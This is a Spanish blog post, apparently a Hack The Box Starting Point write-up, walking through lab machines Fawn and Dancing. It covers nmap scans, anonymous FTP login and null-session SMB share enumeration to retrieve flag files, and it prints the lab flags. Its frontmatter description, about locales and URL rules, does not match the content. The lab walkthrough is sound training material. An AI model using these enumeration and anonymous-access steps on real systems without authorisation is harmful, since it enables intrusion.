---
title: 'Starting Point - Tier 0'
subtitle: 'default locale, fallback y reglas de URL'
description: 'El registro único de locales controla routing, labels, fallback, messages, hero y About content.'
pubDate: '2026-03-07'
heroImage: '../../../assets/blog/default-covers/cyber-03.webp'
---

# Pequeña introducción

Las maquinas de esta sección de HTB son para aprender conceptos básicos y ser amigables con los nuevos usuarios

#Meow

- [Resolución de la maquina Meow (PDF)](https://github.com/PelaoBrazzers/PeladoPenetrationStuff/blob/main/SpanishWritups/Starting_Point/Meow.pdf)

#Fawn

Bienvenido a la segunda maquina introductoria de HTB. Si eres nuevo comprueba que estés dentro de la red de HTB.

### Resolución de preguntas y la máquina
Comprobamos que tenemos una conexión con el objetivo
```bash
ping -c 1 10.129.128.1
PING 10.129.128.1 (10.129.128.1) 56(84) bytes of data.
64 bytes from 10.129.128.1: icmp_seq=1 ttl=63 time=164 ms

--- 10.129.128.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 163.598/163.598/163.598/0.000 ms
```
Recibimos un paquete de vuelta por lo cual hay una conexión
El ping nos muestra un ttl de 63 lo cual se aproxima bastante a 64 que es el ttl sistemas Linux por lo tanto es bastante probable que lo sea
Pasemos a revisar los puertos abiertos.
```bash
sudo nmap 10.129.128.1
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-07 18:29 -0400
Nmap scan report for 10.129.128.1
Host is up (0.20s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 3.04 seconds
```
El puerto 21 esta abierto por lo que puede ser un servicio FTP
Con la flag -A comprobamos con un escaneo agresivo al puerto designado usando la flag -p
```bash
sudo nmap 10.129.128.1 -A -p 21
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-07 18:30 -0400
Nmap scan report for 10.129.128.1
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.85
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Unix

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   185.57 ms 10.10.14.1
2   185.52 ms 10.129.128.1

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds
```
Ahora que verificamos que si estamos ante un servicio FTP veamos que es un servicio FTP.
FTP es el acrónimo de **File Transfer Protocol** (Protocolo de transferencia de archivo). Es utilizado para transferir  archivos. Su **puerto predeterminado es el 21** y es bastante probable que lo encuentres en Linux porque Windows ya tiene un protocolo similar en otro puerto. Una característica muy conocida de este protocolo es que por lo general **no encripta la información** lo cual es una vulnerabilidad importante. Por otro lado tenemos el **SFTP** que viene a ser lo mismo pero seguro, este protocolo **encripta la información** de ahí proviene su nombre Secure FTP.

El comando **ping** envía una traza ICMP para comprobar la conexión con el objetivo.

Ahora que estamos un poco mas informados sobre este protocolo analicemos la información obtenida. 
El escaneo del puerto nos reveló el nombre y la versión del protocolo **vsftpd 3.0.3**, esto se puede comprobar manualmente al interactuar con el protocolo FTP. 
Otra información relevante es que el **sistema operativo es Unix**. "Service Info: OS: Unix"

Información extra: El comando **ftp -?** nos muestra de que es capaz el cliente FTP

El escaneo también nos revela algo muy importante como es que el usuario **anonymous** está disponible. Este usuario es para poder acceder a recursos compartidos sin necesidad de tener un usuario. Esto puede llegar a ser muy comprometedor si el usuario tiene acceso a información importante.
```bash
❯ ftp 10.129.128.1
Connected to 10.129.128.1.
220 (vsFTPd 3.0.3)
Name (10.129.128.1:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
El código de respuesta obtenido por ingresar correctamente es **230**
Solo queda obtener el archivo flag.txt que nos mostró el escaneo. Se maneja similar a una consola linux, **ls** para ver el contenido, **cd** mara moverse entre directorios y **get** para obtener un archivo
```bash
ftp> ls
229 Entering Extended Passive Mode (|||12725|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||63609|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***************************************|    32        9.16 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.17 KiB/s)
ftp> exit
221 Goodbye.
```
Solo queda ver el contenido del archivo descargado
```bash
❯ cat flag.txt
   035db21c881520061c53e0536e44f815
```
Felicidades haz completado Fawn.

# Dancing

### Resolución de preguntas y la máquina
Comencemos comprobando que tenemos conexión con el objetivo
```bash
ping -c 1 10.129.128.65
PING 10.129.128.65 (10.129.128.65) 56(84) bytes of data.
64 bytes from 10.129.128.65: icmp_seq=1 ttl=127 time=184 ms

--- 10.129.128.65 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 183.910/183.910/183.910/0.000 ms
```
El ttl es 127, es muy cercano a 128 que es de Windows por lo tanto es muy probable que sea una maquina windows.
Comprobemos los puertos abiertos del objetivo
```bash
sudo nmap 10.129.128.65
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-07 20:17 -0400
Nmap scan report for 10.129.128.65
Host is up (0.22s latency).
Not shown: 914 closed tcp ports (reset), 82 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 2.88 seconds
```
El puerto 135 parece ser Windows Remote Procedure Call, el 139 NetBIOS, 445 puede ser smb y 5985 Windows Remote Management (WinRM). 
Veamos mas en profundidad esos puertos abiertos
```bash
sudo nmap 10.129.128.65 -A -p 135,139,445,5985 -oN Puertos
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-07 20:23 -0400
Nmap scan report for 10.129.128.65
Host is up (0.17s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-07T22:17:12
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: -2h06m31s

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   181.59 ms 10.10.14.1
2   177.46 ms 10.129.128.65

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
Logramos confirmar la existencia de los servicios SMB, msrpc, netbios y comprobar que es una maquina Windows, además nos dice que no necesitamos un usuario para acceder.
En el puerto 5985 aunque no lo muestre a texto claro, por lo general nmap muestra una salida similar para WinRM pero podemos verificar el servicio con netexec.
```python
netexec winrm 10.129.128.65
WINRM       10.129.128.65   5985   DANCING          [*] Windows 10 / Server 2019 Build 17763 (name:DANCING) (domain:Dancing) 
```
De los servicios que tenemos disponibles el que es mas probable obtener algo es el SMB, porque podemos acceder al mismo sin necesidad de autenticarnos, pero antes veamos un poco el mismo.

SMB es el acrónimo de **Server Message Block**. Su puerto predeterminado es el **445**. Por ahora quedémonos que es una forma de compartir recursos, cada usuario tiene sus propios permisos sobre los "SMB shares" (recursos compartidos SMB).  

Nmap nos muestra el servicio como **microsoft-ds**

Comprobemos los "shares" disponibles con la flag **-L**
```python
smbclient -L //10.129.128.65
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.128.65 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Bueno lo anterior es una forma de ver el contenido y saber que hay 4 "shares" disponibles, pero no es muy informativo para nosotros. Usemos otro comando para obtener un poco más de información.
```bash
smbmap -H 10.129.128.65 -u 'null'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB 
[*] Established 1 SMB connections(s) and 0 authenticated session(s) 
          
[+] IP: 10.129.128.65:445	Name: 10.129.128.65       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	WorkShares                                        	READ, WRITE	
[*] Closed 1 connections                                
```
Solo tenemos permisos sobre IPC$ y WorkShares. Este ultimo tiene un nombre muy llamativo, veamos y obtengamos el contenido de WorkShares.
```python
smbclient //10.129.128.65/WorkShares
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jul  7 18:35:49 2026
  ..                                  D        0  Tue Jul  7 18:35:49 2026
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

		5114111 blocks of size 4096. 1752942 blocks available
smb: \> cd Amy.J\
smb: \Amy.J\> dir
  .                                   D        0  Mon Mar 29 05:08:24 2021
  ..                                  D        0  Mon Mar 29 05:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021

		5114111 blocks of size 4096. 1752942 blocks available
smb: \Amy.J\> get worknotes.txt 
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Amy.J\> cd ..
smb: \> dir
  .                                   D        0  Tue Jul  7 18:35:49 2026
  ..                                  D        0  Tue Jul  7 18:35:49 2026
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

		5114111 blocks of size 4096. 1752942 blocks available
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021
ge
		5114111 blocks of size 4096. 1752942 blocks available
smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \James.P\> exit
```
Después de obtener los 2 archivos solo queda ver su contenido.
```bash
❯ cat flag.txt
5f61c10dffbc77a704d76016a22f1664
❯ cat worknotes.txt
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing                        
```
Felicidades haz completado Dancing

- [Starter Guide 1](/es/blog/starter-guide-1-configure-your-site/)
- [Starter Guide 3](/es/blog/starter-guide-3-comments-about-and-theme-toggles/)
